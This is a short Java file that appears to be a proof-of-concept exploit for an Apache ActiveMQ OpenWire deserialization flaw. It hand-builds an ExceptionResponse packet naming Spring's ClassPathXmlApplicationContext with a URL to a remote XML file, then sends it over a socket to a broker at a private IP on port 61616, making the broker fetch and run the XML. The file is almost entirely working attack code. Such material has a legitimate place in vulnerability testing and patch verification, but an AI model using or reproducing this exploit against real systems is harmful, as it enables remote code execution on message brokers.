import org.apache.activemq.command.ExceptionResponse;
import org.apache.activemq.transport.tcp.TcpTransport;
import org.apache.activemq.openwire.v12.BaseDataStreamMarshaller;
import org.apache.activemq.ActiveMQConnectionFactory;

import java.io.*;
import java.net.Socket;
import java.util.Base64;

public class test {


    public static byte[] makeDOS() throws IOException {

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(baos);
        out.writeInt(1);
        out.writeByte(31);
        out.writeInt(1);
        out.writeBoolean(true);
        out.writeInt(1);
        out.writeBoolean(true);
        out.writeBoolean(true);
        out.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
        out.writeBoolean(true);
        out.writeUTF("http://127.0.0.1/calc.xml");

        byte[] bytes = baos.toByteArray();

        return bytes;
    }

    public static void main(String[] args) throws IOException {

        Socket socket = new Socket("10.58.120.200", 61616);
        byte[] bytes = makeDOS();
        socket.getOutputStream().write(bytes);
        socket.close();



    }
}
